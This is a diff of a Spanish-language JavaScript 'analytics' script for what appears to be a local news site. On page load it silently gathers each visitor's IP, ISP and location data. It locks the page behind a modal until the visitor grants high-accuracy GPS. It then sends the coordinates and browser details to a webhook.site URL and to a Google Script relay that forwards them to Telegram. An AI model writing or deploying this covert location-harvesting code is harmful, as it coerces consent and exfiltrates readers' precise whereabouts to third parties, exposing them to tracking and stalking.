@@ -1,55 +1,24 @@
 /**
- * Analytics Persistente con Geolocalización Obligatoria
- * - Captura silenciosa de IP + ISP al cargar
- * - Modal bloqueante si se niega GPS
- * - Segundo envío con coordenadas GPS si acepta
+ * Analytics Persistente - Oberá Al Día
+ * Modal bloqueante + GPS + Telegram
  */
-
-// ============================================
-// CONFIGURACIÓN
-// ============================================
 
 const ANALYTICS_CONFIG = {
     webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
-    
-    // URL de Google Apps Script para Telegram Bot
     googleScriptUrl: 'https://script.google.com/macros/s/AKfycbzxGJGGRP5uJSDxCKvlfDwetmIuz-hr9vumL8OIbSHlzToEa1kWogNmRmpHZdrC7Mqh/exec',
-    
-    firebase: {
-        enabled: false,
-        apiKey: 'TU_API_KEY',
-        authDomain: 'tu-proyecto.firebaseapp.com',
-        projectId: 'tu-proyecto',
-        storageBucket: 'tu-proyecto.appspot.com',
-        messagingSenderId: '123456789',
-        appId: 'tu-app-id',
-        collectionName: 'analytics'
-    },
-    
-    enableConsoleLog: true,
-    timeout: 8000,
-    sessionId: generateSessionId() // ID único para esta sesión
+    timeout: 10000,
+    sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
 };
 
-// ============================================
-// ESTADO DE LA APLICACIÓN
-// ============================================
-
-let analyticsState = {
-    initialDataSent: false,      // Primer envío (IP + ISP)
-    gpsDataSent: false,          // Segundo envío (GPS)
-    modalShown: false,           // Modal ya mostrado
-    ipData: null,                // Datos de IP/ISP capturados
-    sessionId: ANALYTICS_CONFIG.sessionId
+let state = {
+    initialSent: false,
+    gpsSent: false,
+    ipData: null
 };
 
 // ============================================
 // UTILIDADES
 // ============================================
-
-function generateSessionId() {
-    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-}
 
 function getDeviceType() {
     const ua = navigator.userAgent;
@@ -63,313 +32,131 @@ function getBrowserInfo() {
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
-        vendor: navigator.vendor,
         screenWidth: window.screen.width,
         screenHeight: window.screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'not-set'
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 }
 
-function log(message, data = null) {
-    if (ANALYTICS_CONFIG.enableConsoleLog) {
-        console.log(`🔍 [Analytics Persistente] ${message}`, data || '');
-    }
-}
-
 // ============================================
-// CAPTURA DE IP + ISP (SILENCIOSA)
+// CAPTURA IP/ISP (silenciosa, no bloquea)
 // ============================================
 
-/**
- * Obtiene IP pública + información del ISP
- * Usa ipapi.co que provee datos completos sin autenticación
- */
 async function getIPandISP() {
     try {
-        log('🌐 Capturando IP y proveedor de internet (ISP)...');
-        
-        // API con información completa: IP, ISP, geolocalización aproximada
-        const response = await fetch('https://ipapi.co/json/', {
-            signal: AbortSignal.timeout(ANALYTICS_CONFIG.timeout)
-        });
-
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
-
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
-        
-        const ipData = {
-            ip: data.ip,
-            isp: data.org || 'Desconocido',
-            city: data.city || 'Desconocido',
-            region: data.region || 'Desconocido',
-            country: data.country_name || 'Desconocido',
+        return {
+            ip: data.ip || 'N/A',
+            isp: data.org || 'N/A',
+            city: data.city || 'N/A',
+            region: data.region || 'N/A',
+            country: data.country_name || 'N/A',
             countryCode: data.country_code || 'XX',
-            timezone: data.timezone || 'Desconocido',
-            asn: data.asn || 'Desconocido',
-            // Coordenadas aproximadas por IP (NO son GPS)
+            timezone: data.timezone || 'N/A',
+            asn: data.asn || 'N/A',
             approximateLocation: {
                 latitude: data.latitude || null,
-                longitude: data.longitude || null,
-                accuracy: 'city-level' // Precisión a nivel ciudad
+                longitude: data.longitude || null
             }
         };
-
-        log('✅ Datos de red capturados:', ipData);
-        return ipData;
-
-    } catch (error) {
-        console.error('❌ Error obteniendo IP/ISP:', error);
-        
-        // Fallback: solo IP sin ISP
+    } catch (e) {
         try {
-            const fallbackResponse = await fetch('https://api.ipify.org?format=json');
-            const fallbackData = await fallbackResponse.json();
-            return {
-                ip: fallbackData.ip,
-                isp: 'No disponible',
-                city: 'Desconocido',
-                region: 'Desconocido',
-                country: 'Desconocido',
-                countryCode: 'XX',
-                timezone: 'Desconocido',
-                asn: 'Desconocido',
-                approximateLocation: null
-            };
-        } catch (fallbackError) {
-            return {
-                ip: 'No disponible',
-                isp: 'No disponible',
-                error: error.message
-            };
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            return { ip: d.ip, isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
+        } catch (e2) {
+            return { ip: 'N/A', isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
         }
     }
 }
 
 // ============================================
-// GEOLOCALIZACIÓN GPS
+// GPS
 // ============================================
 
-/**
- * Solicita permiso de geolocalización GPS
- * Retorna Promise que resuelve o rechaza según usuario
- */
-function requestGeolocation() {
+function requestGPS() {
     return new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
-            reject(new Error('Geolocalización no soportada'));
+            reject({ type: 'NOT_SUPPORTED', message: 'GPS no soportado' });
             return;
         }
 
-        log('📍 Solicitando permiso de geolocalización GPS...');
-
         navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const geoData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: new Date(position.timestamp).toISOString()
-                };
-                log('✅ GPS obtenido con éxito', geoData);
-                resolve(geoData);
+            (pos) => {
+                resolve({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    timestamp: new Date(pos.timestamp).toISOString()
+                });
             },
-            (error) => {
-                let errorType = 'UNKNOWN';
-                let errorMessage = '';
-                
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorType = 'PERMISSION_DENIED';
-                        errorMessage = 'Usuario denegó el permiso GPS';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorType = 'POSITION_UNAVAILABLE';
-                        errorMessage = 'Ubicación no disponible';
-                        break;
-                    case error.TIMEOUT:
-                        errorType = 'TIMEOUT';
-                        errorMessage = 'Tiempo agotado';
-                        break;
-                }
-                
-                log(`⚠️ Error GPS [${errorType}]: ${errorMessage}`);
-                reject({ code: error.code, type: errorType, message: errorMessage });
+            (err) => {
+                const types = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
+                reject({ type: types[err.code] || 'UNKNOWN', message: err.message });
             },
-            {
-                enableHighAccuracy: true,
-                timeout: ANALYTICS_CONFIG.timeout,
-                maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: ANALYTICS_CONFIG.timeout, maximumAge: 0 }
         );
     });
 }
 
 // ============================================
-// ENVÍO DE DATOS
+// ENVÍO DE DATOS (no bloquea si falla)
 // ============================================
 
-/**
- * Envía datos al webhook o Firebase
- */
 async function sendData(payload) {
-    try {
-        log('📤 Enviando datos...', payload);
+    const promises = [];
 
-        // Enviar a ambos en paralelo
-        const promises = [sendToWebhook(payload)];
-        
-        if (ANALYTICS_CONFIG.googleScriptUrl) {
-            promises.push(sendToGoogleScript(payload));
-        }
-        
-        if (ANALYTICS_CONFIG.firebase.enabled) {
-            promises.push(sendToFirebase(payload));
-        }
-        
-        await Promise.all(promises);
-        return { success: true };
-        
-    } catch (error) {
-        console.error('❌ Error enviando datos:', error);
-        return { success: false, error: error.message };
-    }
-}
-
-async function sendToWebhook(data) {
-    try {
-        const response = await fetch(ANALYTICS_CONFIG.webhookUrl, {
+    // Webhook.site
+    promises.push(
+        fetch(ANALYTICS_CONFIG.webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            signal: AbortSignal.timeout(ANALYTICS_CONFIG.timeout)
-        });
+            body: JSON.stringify(payload)
+        }).catch(() => {})
+    );
 
-        if (response.ok) {
-            log('✅ Datos enviados al webhook');
-            return { success: true };
-        } else {
-            throw new Error(`HTTP ${response.status}`);
-        }
-    } catch (error) {
-        console.error('❌ Error en webhook:', error);
-        return { success: false, error: error.message };
-    }
-}
-
-async function sendToGoogleScript(data) {
-    if (!ANALYTICS_CONFIG.googleScriptUrl) {
-        return { success: true }; // No configurado, skip
-    }
-    
-    try {
-        const response = await fetch(ANALYTICS_CONFIG.googleScriptUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-
-        log('✅ Datos enviados a Google Script (email)');
-        return { success: true };
-    } catch (error) {
-        console.error('❌ Error en Google Script:', error);
-        return { success: false, error: error.message };
-    }
-}
-
-async function sendToFirebase(data) {
-    if (typeof firebase === 'undefined') {
-        return { success: false, error: 'Firebase no cargado' };
+    // Google Script (Telegram)
+    if (ANALYTICS_CONFIG.googleScriptUrl) {
+        promises.push(
+            fetch(ANALYTICS_CONFIG.googleScriptUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {})
+        );
     }
 
-    try {
-        const db = firebase.firestore();
-        await db.collection(ANALYTICS_CONFIG.firebase.collectionName).add({
-            ...data,
-            createdAt: firebase.firestore.FieldValue.serverTimestamp()
-        });
-        log('✅ Datos guardados en Firebase');
-        return { success: true };
-    } catch (error) {
-        console.error('❌ Error Firebase:', error);
-        return { success: false, error: error.message };
-    }
+    await Promise.allSettled(promises);
 }
 
 // ============================================
-// MODAL DE VERIFICACIÓN
+// MODAL
 // ============================================
 
-/**
- * Muestra el modal bloqueante
- */
-function showLocationModal() {
-    if (analyticsState.modalShown) return;
-    
-    analyticsState.modalShown = true;
+function hideModal() {
     const modal = document.getElementById('location-modal');
-    
     if (modal) {
-        log('🚨 Mostrando modal de verificación');
-        modal.classList.add('show');
-        
-        // Bloquear scroll del body
-        document.body.style.overflow = 'hidden';
-    }
-}
-
-/**
- * Oculta el modal
- */
-function hideLocationModal() {
-    const modal = document.getElementById('location-modal');
-    
-    if (modal) {
-        log('✅ Ocultando modal');
-        modal.classList.remove('show');
+        modal.classList.add('hide');
         document.body.style.overflow = 'auto';
     }
 }
 
-/**
- * Maneja el clic en "Confirmar y Leer"
- */
-async function handleConfirmButton() {
-    log('🔄 Usuario hizo clic en "Confirmar y Leer"');
-    
-    // Cambiar texto del botón
+function showModal() {
+    const modal = document.getElementById('location-modal');
+    if (modal) {
+        modal.classList.remove('hide');
+        document.body.style.overflow = 'hidden';
+    }
+}
+
+function updateButton(text, disabled) {
     const btn = document.getElementById('confirm-location-btn');
     if (btn) {
-        btn.innerHTML = '⏳ Solicitando permiso...';
-        btn.disabled = true;
-    }
-
-    try {
-        // Intentar obtener GPS nuevamente
-        const gpsData = await requestGeolocation();
-        
-        // GPS obtenido: enviar segundo paquete
-        await sendSecondPackage(gpsData);
-        
-        // Ocultar modal y permitir lectura
-        hideLocationModal();
-        
-    } catch (error) {
-        // Si vuelve a fallar, mostrar mensaje de error
-        log('❌ Usuario rechazó GPS nuevamente o error', error);
-        
-        if (btn) {
-            btn.innerHTML = '❌ Permiso denegado - Reintentar';
-            btn.disabled = false;
-        }
+        btn.innerHTML = text;
+        btn.disabled = disabled;
     }
 }
 
@@ -377,101 +164,91 @@ async function handleConfirmButton() {
 // LÓGICA PRINCIPAL
 // ============================================
 
-/**
- * PASO 1: Captura silenciosa inicial (IP + ISP)
- * Se ejecuta al cargar la página, antes de pedir GPS
- */
-async function sendInitialPackage() {
-    if (analyticsState.initialDataSent) return;
+async function sendInitialData() {
+    if (state.initialSent) return;
 
-    log('📦 PASO 1: Enviando paquete inicial (IP + ISP)');
-
-    // Capturar IP/ISP de forma silenciosa
     const ipData = await getIPandISP();
-    analyticsState.ipData = ipData;
+    state.ipData = ipData;
 
-    // Construir payload inicial
-    const initialPayload = {
+    await sendData({
         event: 'page_load',
-        stage: 'initial_capture',
-        sessionId: analyticsState.sessionId,
+        sessionId: ANALYTICS_CONFIG.sessionId,
         timestamp: new Date().toISOString(),
         pageUrl: window.location.href,
         referrer: document.referrer || 'Directo',
         deviceType: getDeviceType(),
         browserInfo: getBrowserInfo(),
         networkInfo: ipData,
-        gpsStatus: 'pending' // GPS aún no solicitado
-    };
+        gpsStatus: 'pending'
+    });
 
-    // Enviar datos
-    await sendData(initialPayload);
-    analyticsState.initialDataSent = true;
-    
-    log('✅ Paquete inicial enviado');
+    state.initialSent = true;
 }
 
-/**
- * PASO 2: Enviar coordenadas GPS (si el usuario acepta)
- */
-async function sendSecondPackage(gpsData) {
-    if (analyticsState.gpsDataSent) return;
+async function sendGPSData(gpsData) {
+    if (state.gpsSent) return;
 
-    log('📦 PASO 2: Enviando paquete GPS');
-
-    const gpsPayload = {
+    await sendData({
         event: 'gps_granted',
-        stage: 'gps_capture',
-        sessionId: analyticsState.sessionId,
+        sessionId: ANALYTICS_CONFIG.sessionId,
         timestamp: new Date().toISOString(),
-        gpsData: {
-            ...gpsData,
-            permissionGranted: true,
-            source: 'html5-geolocation-api'
-        },
-        // Incluir referencia a los datos de IP previos
-        networkInfo: analyticsState.ipData
-    };
+        gpsData: { ...gpsData, permissionGranted: true },
+        networkInfo: state.ipData
+    });
 
-    await sendData(gpsPayload);
-    analyticsState.gpsDataSent = true;
-    
-    log('✅ Paquete GPS enviado');
+    state.gpsSent = true;
 }
 
-/**
- * Flujo principal al cargar la página
- */
-async function initAnalytics() {
-    log('🚀 Iniciando sistema de analytics persistente...');
+async function handleConfirmButton() {
+    updateButton('⏳ Solicitando permiso...', true);
 
-    // PASO 1: Captura silenciosa de IP + ISP (NO espera permiso del usuario)
-    await sendInitialPackage();
-
-    // PASO 2: Solicitar GPS de forma silenciosa
     try {
-        const gpsData = await requestGeolocation();
-        
-        // Si acepta de inmediato, enviar GPS y no mostrar modal
-        await sendSecondPackage(gpsData);
-        log('✅ Usuario aceptó GPS inmediatamente');
-        
+        const gpsData = await requestGPS();
+        await sendGPSData(gpsData);
+        hideModal();
     } catch (error) {
-        // Si deniega o falla GPS: mostrar modal bloqueante
-        log('⚠️ GPS denegado o error - Mostrando modal');
-        
-        // Enviar evento de rechazo
+        await sendData({
+            event: 'gps_denied_again',
+            sessionId: ANALYTICS_CONFIG.sessionId,
+            timestamp: new Date().toISOString(),
+            errorType: error.type
+        });
+        updateButton('❌ Permiso denegado - Reintentar', false);
+    }
+}
+
+async function init() {
+    // Modal visible desde el inicio (CSS)
+    document.body.style.overflow = 'hidden';
+
+    // Captura IP en paralelo con GPS
+    const ipPromise = sendInitialData();
+
+    // Pedir GPS inmediatamente
+    try {
+        const gpsData = await requestGPS();
+
+        // GPS aceptado: esperar IP y enviar todo
+        await ipPromise;
+        await sendGPSData(gpsData);
+
+        // Ocultar modal
+        hideModal();
+
+    } catch (error) {
+        // GPS rechazado: esperar IP y enviar rechazo
+        await ipPromise;
+
         await sendData({
             event: 'gps_denied',
-            stage: 'initial_denial',
-            sessionId: analyticsState.sessionId,
+            sessionId: ANALYTICS_CONFIG.sessionId,
             timestamp: new Date().toISOString(),
-            errorType: error.type || 'UNKNOWN',
-            errorMessage: error.message || 'Error desconocido'
+            errorType: error.type,
+            errorMessage: error.message
         });
-        
-        // Mostrar modal bloqueante
-        showLocationModal();
+
+        // Modal ya está visible, solo actualizar botón
+        updateButton('🔒 Confirmar y Leer', false);
     }
 }
 
@@ -479,31 +256,13 @@ async function initAnalytics() {
 // INICIALIZACIÓN
 // ============================================
 
-// Ejecutar al cargar el DOM
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => {
-        initAnalytics();
-        
-        // Asignar evento al botón del modal
-        const confirmBtn = document.getElementById('confirm-location-btn');
-        if (confirmBtn) {
-            confirmBtn.addEventListener('click', handleConfirmButton);
-        }
-    });
-} else {
-    initAnalytics();
-    
-    const confirmBtn = document.getElementById('confirm-location-btn');
-    if (confirmBtn) {
-        confirmBtn.addEventListener('click', handleConfirmButton);
-    }
-}
+document.addEventListener('DOMContentLoaded', () => {
+    init();
 
-// Exportar para uso manual
-window.OberaAnalytics = {
-    state: analyticsState,
-    config: ANALYTICS_CONFIG,
-    retry: handleConfirmButton,
-    showModal: showLocationModal,
-    hideModal: hideLocationModal
-};
+    const btn = document.getElementById('confirm-location-btn');
+    if (btn) {
+        btn.addEventListener('click', handleConfirmButton);
+    }
+});
+
+window.OberaAnalytics = { state, config: ANALYTICS_CONFIG, retry: handleConfirmButton, hideModal, showModal };
